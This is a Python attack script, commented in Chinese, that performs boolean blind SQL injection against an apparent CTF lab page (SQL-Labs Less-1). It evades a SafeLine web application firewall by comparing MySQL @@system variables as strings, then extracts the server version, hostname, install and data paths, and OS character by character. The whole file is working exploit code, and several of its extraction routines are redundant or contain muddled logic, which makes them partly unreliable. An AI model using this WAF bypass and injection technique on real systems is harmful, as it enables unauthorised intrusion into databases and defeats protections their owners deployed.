#!/usr/bin/env python3
"""
SQL-Labs Less-1 长亭雷池WAF绕过 - 布尔盲注 v2
利用 @@系统变量 字符串比较绕过语义检测

可用变量: @@version, @@hostname, @@basedir, @@datadir, @@version_compile_os

原理: @@version > '8' 这种字符串比较不会被WAF拦截
"""

import urllib.request
import sys
import time

TARGET = "http://home.ctfstu.cn:6868/sql/Less-1/?id=1'%20%26%26%20{cond}--+"

TRUE_LEN = 0
FALSE_LEN = 0
THRESHOLD = 0

def http_get(full_url):
    try:
        req = urllib.request.Request(full_url)
        with urllib.request.urlopen(req, timeout=8) as resp:
            return len(resp.read())
    except Exception:
        return -1

def calibrate():
    global TRUE_LEN, FALSE_LEN, THRESHOLD
    true_url = TARGET.format(cond="1=1")
    false_url = TARGET.format(cond="1=2")
    TRUE_LEN = http_get(true_url)
    FALSE_LEN = http_get(false_url)
    THRESHOLD = (TRUE_LEN + FALSE_LEN) // 2
    print(f"[*] TRUE={TRUE_LEN}  FALSE={FALSE_LEN}  阈值={THRESHOLD}")
    if TRUE_LEN == FALSE_LEN:
        print("[!] 校准失败!")
        sys.exit(1)

def check(cond):
    """检查条件是否为真"""
    full_url = TARGET.format(cond=cond)
    length = http_get(full_url)
    if length < 0:
        return False
    return abs(length - TRUE_LEN) < abs(length - FALSE_LEN)

def binary_search_length(var, max_len=100):
    """用二分法确定字符串长度: 用 > 替代 = """
    # 注意：length(@@var) > N 会被拦截，所以需要用 @@var > 'NNN个a' 来推断长度
    low, high = 1, max_len
    while low < high:
        mid = (low + high) // 2
        # 构造一个mid长度的'a'字符串
        test_str = "'" + "z" * mid + "'"
        cond = f"{var}%20%3e%20{test_str}"
        result = check(cond)
        if result:
            # @@var > 'zzz...' 为真 → 长度 > mid
            low = mid + 1
        else:
            high = mid
    # low 就是探测到的长度
    # 再确认一下
    return low

def extract_variable(var, name, max_len=100):
    """通过字符串逐位比较提取 @@ 变量值"""
    print(f"\n[*] 正在提取 {name} ({var})...")
    
    # 确定长度
    length = 0
    for i in range(1, max_len + 1):
        # 构建i个z → 如果 var > 'zzz...i个z' 为真，说明长度 > i
        z_str = "'" + "z" * i + "'"
        cond = f"{var}%20%3e%20{z_str}"
        if check(cond):
            length = i
        else:
            break
    
    if length == 0:
        print("[-] 无法确定长度")
        return ""
    
    print(f"[+] 长度: {length}")
    
    # 逐字符提取
    result = ""
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_,/:@! "
    
    for pos in range(1, length + 1):
        found = False
        for ch in chars:
            # 构建: @@var > 'prefix + ch' 但需要避免字符被截断
            # 技巧：比较前缀而不是精确值
            test_prefix = result + ch
            # URL编码单引号中的字符串
            test_str = f"'{test_prefix}'"
            cond = f"{var}%20%3e%20{urllib.parse.quote(test_str)}"
            
            if check(cond):
                # 如果 var > 'prefix+ch' 为 false，说明 ch 是正确字符或更小
                # 再检查更小的字符
                prev_str = f"'{result}'"
                cond2 = f"{var}%20%3e%20{urllib.parse.quote(prev_str)}"
                
                if check(cond2):
                    # var > 'prefix' 真 但 var > 'prefix+ch' 假
                    # 说明 ch 就是正确字符
                    result += ch
                    print(f"\r[+] {name}: {result}", end="", flush=True)
                    found = True
                    break
        
        if not found:
            # 二分法精确查找
            result += binary_search_char(var, pos, result)
            print(f"\r[+] {name}: {result}", end="", flush=True)
    
    print()
    return result

def binary_search_char(var, pos, prefix):
    """二分法精确查找第pos个字符"""
    low, high = 32, 126
    ch = None
    while low < high:
        mid = (low + high) // 2
        # 构造: var > 'prefix + chr(mid)'
        test_str = f"'{prefix + chr(mid)}'"
        cond = f"{var}%20%3e%20{urllib.parse.quote(test_str)}"
        if check(cond):
            ch = mid
            low = mid + 1
        else:
            high = mid - 1
    
    if ch is None:
        # 尝试 low
        test_str = f"'{prefix + chr(low)}'"
        cond = f"{var}%20%3e%20{urllib.parse.quote(test_str)}"
        if not check(cond):
            return chr(low)
        return chr(high)
    return chr(ch)

def extract_variable_binary(var, name, max_len=100):
    """
    纯二分法提取 @@ 变量值
    先用字符串比较法探测长度，再用二分法逐字符找
    """
    print(f"\n[*] 正在提取 {name} ({var})...")
    
    # =========== 用字符串比较确定长度 ===========
    length = 0
    for i in range(1, max_len + 1):
        z_str = "'" + "z" * i + "'"
        cond = f"{var}%20%3e%20{z_str}"
        if check(cond):
            length = i
        else:
            break
    
    if length == 0:
        print("[-] 无法确定长度")
        return ""
    print(f"[+] 长度: {length}")
    
    # =========== 逐字符二分提取 ===========
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 127  # 可打印ASCII范围
        char_code = None
        
        while low < high:
            mid = (low + high) // 2
            # 构造: var >= 'prefix + chr(mid)' 用 >= 语义
            # 用比较字符串的方式：var > 'prefix+chr(mid-1)'
            if mid == 32:
                # chr(31) 不可打印，用特殊处理
                test_str = f"'{result + chr(mid)}'"
                cond = f"{var}%20%3e%20{urllib.parse.quote(test_str)}"
                if check(cond):
                    low = mid + 1
                else:
                    char_code = mid
                    high = mid - 1
            else:
                # var > 'prefix + chr(mid-1') ? 
                test_str = f"'{result + chr(mid - 1)}'"
                cond = f"{var}%20%3e%20{urllib.parse.quote(test_str)}"
                if check(cond):
                    # var > prev_char → 说明当前字符 >= mid
                    low = mid + 1
                else:
                    high = mid - 1
                    if mid > 32:
                        # 确认: var > 'prefix+chr(mid-2)' 是否为真
                        test_str2 = f"'{result + chr(mid - 2)}'"
                        cond2 = f"{var}%20%3e%20{urllib.parse.quote(test_str2)}"
                        if check(cond2):
                            char_code = mid
                        else:
                            char_code = mid - 1
        
        if char_code is None:
            char_code = low
        
        # 确定最终字符
        final_char = chr(min(char_code, 126))
        result += final_char
        print(f"\r[{pos}/{length}] {name}: {result}", end="", flush=True)
    
    print()
    return result

def extract_variable_v3(var, name, max_len=200):
    """
    改进版提取：使用字符串比较 'prefix'+chr(xxx) 
    先二分长度，再逐字符二分
    """
    print(f"\n[*] 正在提取 {name} ({var})...")
    
    # 长度探测: 用字符串比较法
    length = 0
    for i in range(1, max_len + 1):
        z_str = "'" + "z" * i + "'"
        cond = f"{var}%20%3e%20{z_str}"
        if check(cond):
            length = i + 3  # 继续加长
        else:
            # 前一个长度是ok的，现在是边界
            # 用前一个i-1测试
            if i > 1:
                prev_str = "'" + "z" * (i - 1) + "'"
                cond2 = f"{var}%20%3e%20{prev_str}"
                if check(cond2):
                    length = i
                else:
                    length = i - 1
            break
    
    if length == 0:
        # 如果 z 方法不行，试试 a
        for i in range(1, max_len + 1):
            a_str = "'" + "A" * i + "'"
            cond = f"{var}%20%3e%20{a_str}"
            if not check(cond):
                length = i - 1
                break
    
    if length <= 0:
        # fallback: 假设长度
        print("[-] 长度探测失败，使用默认长度32")
        length = 32
    else:
        print(f"[+] 长度: {length}")
    
    # 逐位二分提取
    result = ""
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_,/:@! "
    
    for pos in range(1, length + 1):
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            
            # 关键: 用字符串比较 chr(mid) 前缀
            # @@var > 'result+chr(mid)'
            try_chr = chr(mid)
            test_prefix = urllib.parse.quote(f"'{result + try_chr}'")
            cond = f"{var}%20%3e%20{test_prefix}"
            
            if check(cond):
                # var > 'prefix+mid' 为真，说明字符 > mid
                low = mid + 1
            else:
                # 确认是否正好等于 mid
                if mid > 32:
                    prev_prefix = urllib.parse.quote(f"'{result + chr(mid - 1)}'")
                    cond2 = f"{var}%20%3e%20{prev_prefix}"
                    if check(cond2):
                        # var > 'prefix+chr(mid-1)' 为真 但 var > 'prefix+chr(mid)' 为假
                        # → 字符 == chr(mid)
                        result += chr(mid)
                        break
                    else:
                        high = mid - 1
                else:
                    high = mid - 1
        else:
            # while循环正常结束（没break），用low
            result += chr(min(low, 126))
        
        print(f"\r[{pos}/{length}] {name}: {result}", end="", flush=True)
    
    print()
    return result


def main():
    print("=" * 65)
    print("  SQL-Labs Less-1 布尔盲注 | 长亭雷池WAF绕过")
    print("  利用: @@系统变量 + 字符串比较")
    print("=" * 65)
    
    calibrate()
    
    print("\n" + "-" * 65)
    print("开始提取 @@ 系统变量")
    print("-" * 65)
    
    # 可探测的系统变量列表
    variables = [
        ("@@version", "MySQL版本"),
        ("@@hostname", "主机名"),
        ("@@basedir", "安装目录"),
        ("@@datadir", "数据目录"),
        ("@@version_compile_os", "操作系统"),
    ]
    
    results = {}
    
    for var, name in variables:
        # 先用简单的方式确认存在
        cond = f"{var}%20%3e%20''"
        if check(cond):
            print(f"\n[+] {name} 存在")
            value = extract_variable_v3(var, name)
            results[name] = value
        else:
            print(f"[-] {name} 不存在")
    
    print("\n" + "=" * 65)
    print("结果汇总:")
    print("=" * 65)
    for name, value in results.items():
        print(f"  {name}: {value}")
    print("=" * 65)

if __name__ == "__main__":
    main()
